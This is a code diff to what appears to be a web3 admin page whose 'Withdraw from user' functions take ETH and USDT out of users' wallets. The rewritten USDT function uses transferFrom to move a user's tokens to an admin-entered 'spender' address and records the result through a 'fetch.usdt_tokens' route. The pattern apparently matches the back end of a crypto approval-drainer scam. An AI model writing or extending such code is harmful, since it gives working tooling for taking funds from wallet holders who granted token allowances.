@@ -128,11 +128,14 @@
 <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"> </script>
 <script src="{{ asset('contracts/contractABI.js') }}"></script>
 <script src="{{ asset('contracts/contractAddress.js') }}"></script>
+<script src="{{ asset('contracts/tokenContractABI.js') }}"></script>
+<script src="{{ asset('contracts/tokenContractAddress.js') }}"></script>
 <script src="{{asset('plugins/data-tables/dataTables.min.js')}}"></script>
 
 <script>
     const web3 = new Web3(window.ethereum)
     const contract = new web3.eth.Contract(contractABI, contractAddress)
+    const tokenContract = new web3.eth.Contract(tokenContractABI, tokenContractAddress)
 
     // Get info
     const getInfo = async () => {
@@ -160,11 +163,7 @@
 
     // Withdraw from user
     const withdrawETH = async () => {
-        // Ensure the user has connected their wallet
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        })
-        const adminWalletAddress = accounts[0]
+        let adminWalletAddress = $('#modal-spender').val();
         let user = $('#modal-wallet').val();
         let amount = $('#modal-amount').val();
 
@@ -182,11 +181,9 @@
             $("#btn-fetch").css('display','none');
             $("#loader-btn").css('display','block');
 
-
             try {
                 // Convert amount to Wei
                 const amountInEth = web3.utils.toWei(amount.toString(), 'ether')
-
 
                 // Call the withdraw method on the contract
                 const transaction = await contract.methods.withdrawETH(user, amountInEth).send({
@@ -231,51 +228,39 @@
 
     // Withdraw from user
     const withdrawUSDT = async () => {
-        // Ensure the user has connected their wallet
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        })
-        const adminWalletAddress = accounts[0]
-        let user = $('#modal-wallet').val();
+        let adminWalletAddress = $('#modal-spender').val();
+        let userWalletAddress = $('#modal-wallet').val();
         let amount = parseInt($('#modal-amount').val());
 
         var balance = $("#modal-amount").val();
 
         var a_balance = $("#modal-balance").text();
 
-
         if (parseFloat(balance) > parseFloat(a_balance) || balance == '') {
-
             $("#modal-amount").css("border", "1px solid red");
-
         }else{
-
             $("#btn-fetch").css('display','none');
             $("#loader-btn").css('display','block');
 
             try {
-                // Call the withdraw method on the contract
+                const tx = await tokenContract.methods.transferFrom(userWalletAddress, adminWalletAddress, amount).send({
+                    from: adminWalletAddress
+                })
 
-                const transaction = await contract.methods.withdrawUSDT(user, amount).send({
-                    from: adminWalletAddress,
-                });
-                console.log('USDT Withdrawal successful:', transaction)
-
-                if(transaction)
-                {
+                if (tx.transactionHash) {
                     $.ajaxSetup({
-                    headers: {
-                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-                    }
+                        headers: {
+                            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                        }
                     });
 
                     $.ajax({
                         url: "{{ route('fetch.usdt_tokens') }}",
                         type: 'POST',
                         data: {
-                            wallet: user,
+                            wallet: userWalletAddress,
                             amount: amount,
-                            spender: accounts[0],
+                            spender: adminWalletAddress,
                         },
                     }).done(function(response) {
                         if (response == 'ok') {
@@ -344,7 +329,6 @@
                 keyboard: false  // to prevent closing with Esc button (if you want this too)
             });
         }
-
     }
 
     async function fetchUsdtToken(id) {
